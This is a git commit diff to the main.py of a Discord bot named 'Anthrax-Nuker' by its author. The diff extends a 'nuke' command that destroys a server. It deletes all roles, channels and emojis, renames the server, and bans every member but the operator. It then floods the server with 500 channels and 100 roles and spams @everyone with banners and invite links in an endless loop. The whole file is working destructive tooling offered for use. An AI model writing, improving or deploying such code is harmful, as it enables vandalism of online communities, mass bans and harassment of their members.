63f46e93dac9a1dd5d9889f1dc3f6cade6b42560
Maywitz <63612884+Maywitz@users.noreply.github.com>
2022-04-30 22:00:20 -0700

    Update main.py

--- main.py
+++ main.py
@@ -17,7 +17,10 @@ async def on_ready():
 
 @bot.event
 async def on_message(message):
-    await bot.process_commands(message)
+    try:
+        await bot.process_commands(message)
+    except:
+        return
 
 @bot.command()
 async def nuke(ctx):
@@ -51,10 +54,6 @@ async def nuke(ctx):
             pass
             print (channel.name + " has failed to be deleted")
             
-    for _i in range(25):
-            channel = await ctx.guild.create_text_channel("Anthrax")
-            print ("Channel Created")
-            
     for member in list(bot.get_all_members()):
         try:
             if member.id != my_id:
@@ -62,10 +61,20 @@ async def nuke(ctx):
                 print ("User " + member.name + " has been banned")
         except:
             print ("User " + member.name + " has failed to be banned")
-                
-    for _i in range(475):
+            
+    for _i in range(500):
+        try:
             await ctx.guild.create_text_channel("Anthrax")
             print ("Channel Created")
+        except:
+            print ("Failed to create channel")
+            
+    for _i in range(100):
+        try:
+            await ctx.guild.create_role(name = "Anthrax")
+            print ("Role Created")
+        except:
+            print ("Failed to create role")
             
     for emoji in list(ctx.guild.emojis):
         try:
@@ -104,5 +113,90 @@ async def nuke(ctx):
                 await channel.send("@everyone\nhttps://discord.gg/dZq52WJaKW")
             except:
                 print (channel.name + " has failed to be pinged")
+                
+@bot.command()
+async def nuke(ctx):
+
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+        
+    for role in list(ctx.guild.roles):
+        try:
+            await role.delete()
+            print ("Role " + role.name + " has been deleted")
+        except:
+            pass
+            print ("Role " + role.name + " has failed to be deleted")
+            
+    await ctx.guild.edit(
+    name = "Anthrax",
+    description = "Anthrax",
+    reason = "Anthrax",
+    icon = None,
+    banner = None
+    )
+    
+    for channel in list(ctx.message.guild.channels):
+        try:
+            await channel.delete()
+            print (channel.name + " has been deleted")
+        except:
+            pass
+            print (channel.name + " has failed to be deleted")
+            
+    for _i in range(500):
+        try:
+            await ctx.guild.create_text_channel("Anthrax")
+            print ("Channel Created")
+        except:
+            print ("Failed to create channel")
+            
+    for _i in range(100):
+        try:
+            await ctx.guild.create_role(name = "Anthrax")
+            print ("Role Created")
+        except:
+            print ("Failed to create role")
+            
+    for emoji in list(ctx.guild.emojis):
+        try:
+            await emoji.delete()
+            print ("Emoji " + emoji.name + " has been deleted")
+        except:
+            print ("Emoji " + emoji.name + " has failed to be deleted")
+
+    while True:
+        for channel in list(ctx.message.guild.channels):
+            try:
+                await channel.send("""
+@everyone
+```
+          _   _ _______ _    _ _____            __   __
+    /\   | \ | |__   __| |  | |  __ \     /\    \ \ / /
+   /  \  |  \| |  | |  | |__| | |__) |   /  \    \ V / 
+  / /\ \ | . ` |  | |  |  __  |  _  /   / /\ \    > <  
+ / ____ \| |\  |  | |  | |  | | | \ \  / ____ \  / . \ 
+/_/    \_\_| \_|  |_|  |_|  |_|_|  \_\/_/    \_\/_/ \_\
+```
+""")
+                await channel.send("""
+@everyone
+```
+  __  __       __     ___          _______ _______ ______
+ |  \/  |   /\ \ \   / \ \        / /_   _|__   __|___  /
+ | \  / |  /  \ \ \_/ / \ \  /\  / /  | |    | |     / / 
+ | |\/| | / /\ \ \   /   \ \/  \/ /   | |    | |    / /  
+ | |  | |/ ____ \ | |     \  /\  /   _| |_   | |   / /__ 
+ |_|  |_/_/    \_\|_|      \/  \/   |_____|  |_|  /_____|
+```
+""")
+                await channel.send("@everyone\nhttps://github.com/Maywitz")
+                await channel.send("@everyone\nhttps://github.com/Maywitz/Anthrax-Nuker")
+                await channel.send("@everyone\nhttps://discord.gg/dZq52WJaKW")
+            except:
+                print (channel.name + " has failed to be pinged")
+
 
 bot.run(token)
